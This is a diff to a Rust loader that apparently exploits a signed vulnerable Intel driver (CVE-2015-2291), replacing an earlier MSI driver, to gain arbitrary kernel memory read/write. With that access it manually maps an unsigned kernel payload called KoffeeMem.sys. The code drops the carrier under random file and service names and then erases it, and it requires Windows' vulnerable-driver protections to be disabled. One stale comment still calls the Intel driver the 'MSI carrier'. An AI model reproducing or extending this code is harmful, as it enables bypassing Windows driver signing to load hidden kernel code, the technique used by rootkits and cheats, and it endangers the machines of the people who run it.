@@ -1,10 +1,11 @@
-//! BYOVD loader: registers the signed MSI RTCore64.sys carrier (CVE-2019-16098),
+//! BYOVD loader: registers the signed Intel iqvw64e.sys carrier (CVE-2015-2291),
 //! then manually maps KoffeeMem.sys into kernel pool and calls DriverEntry.
 //!
-//! Carrier: RTCore64.sys — official MSI Afterburner component, signed by
-//! Microsoft. No test signing, no Secure Boot changes. The driver dereferences
-//! a caller-supplied pointer in its own kernel context, giving us arbitrary
-//! kernel-VA read/write (see rtc.rs). No CR3 discovery, no page-table walking.
+//! Carrier: iqvw64e.sys — official Intel Network Adapter Diagnostic Driver,
+//! signed by Microsoft. No test signing, no Secure Boot changes. One buffered
+//! IOCTL dispatches on a case number: 0x33 copies between arbitrary
+//! addresses, 0x30 fills, 0x25 VA->PA, 0x19/0x1A map/unmap (see rtc.rs).
+//! No CR3 discovery, no page-table walking.
 //!
 //! NOTE: Windows blocks known-vulnerable signed drivers when HVCI/Memory
 //! Integrity is on or VulnerableDriverBlocklistEnable=1. Users must have:
@@ -40,9 +41,9 @@ use windows_sys::Win32::Storage::FileSystem::{
 
 // ── Embedded driver images ────────────────────────────────────────────────
 
-/// RTCore64.sys — the signed MSI carrier (kdmapper-shipped BYOVD driver).
+/// iqvw64e.sys — the signed MSI carrier (kdmapper-shipped BYOVD driver).
 /// Loaded via imagepath + NtLoadDriver under its real signature.
-const RTC_BYTES: &[u8] = include_bytes!("../../../driver/RTCore64.sys");
+const RTC_BYTES: &[u8] = include_bytes!("../../../driver/iqvw64e.sys");
 
 /// Our kernel payload.  Built BEFORE this binary via build.bat (msbuild first).
 const SYS_BYTES: &[u8] = include_bytes!("../../../driver/x64/Debug/KoffeeMem.sys");
@@ -140,10 +141,10 @@ pub fn ensure_loaded() -> io::Result<()> {
     dlog!("loader: BYOVD start");
     println!("[+] loader: device not found -- starting BYOVD sequence");
 
-    // 1. Drop RTCore64.sys to %TEMP% under a random name.
+    // 1. Drop iqvw64e.sys to %TEMP% under a random name.
     let rtc_path = write_temp_file("rtc", RTC_BYTES)?;
     dlog!("loader: temp = {}", rtc_path.display());
-    println!("[+] loader: RTCore64.sys → {}", rtc_path.display());
+    println!("[+] loader: iqvw64e.sys → {}", rtc_path.display());
 
     // 2. Random service name, register + load the carrier.
     let svc_name = random_name(16);
@@ -161,7 +162,7 @@ pub fn ensure_loaded() -> io::Result<()> {
         return Err(e);
     }
     dlog!("loader: register_and_start ok");
-    println!("[+] loader: RTCore64.sys loaded (svc: {})", svc_name);
+    println!("[+] loader: iqvw64e.sys loaded (svc: {})", svc_name);
 
     // Helper: full cleanup macro (always called on any error after the
     // carrier is loaded). Takes everything by reference explicitly.
@@ -185,7 +186,7 @@ pub fn ensure_loaded() -> io::Result<()> {
         e
     })?;
     dlog!("loader: Rtc::open ok");
-    println!("[+] loader: \\.\\RTCore64 opened");
+    println!("[+] loader: \\.\\Nal opened");
 
     // 4. Get ntoskrnl base + sanity-check MZ through the carrier.
     let ntos_base = kernel::get_kernel_module_address("ntoskrnl.exe")
@@ -198,7 +199,7 @@ pub fn ensure_loaded() -> io::Result<()> {
     if &mz != b"MZ" {
         rtc_cleanup!(&rtc_dev, ntos_base, None::<u64>, &svc_name, &rtc_path);
         return Err(io::Error::new(io::ErrorKind::Other,
-            "RTCore64 read sanity check failed: no MZ at ntoskrnl base"));
+            "carrier read sanity check failed: no MZ at ntoskrnl base"));
     }
     println!("[+] loader: ntoskrnl MZ confirmed via carrier");
 
@@ -234,7 +235,7 @@ pub fn ensure_loaded() -> io::Result<()> {
     //    800 ms is far more than needed (~50 ms typical); gives margin for load.
     std::thread::sleep(std::time::Duration::from_millis(800));
     rtc_cleanup!(&rtc_dev, ntos_base, None::<u64>, &svc_name, &rtc_path);
-    println!("[+] loader: RTCore64.sys unloaded and erased");
+    println!("[+] loader: iqvw64e.sys unloaded and erased");
 
     // 8. Establish session-local DOS mapping for \\.\KoffeeMem.
     //     DriverEntry called IoCreateDriver → IoCreateSymbolicLink may fail from that
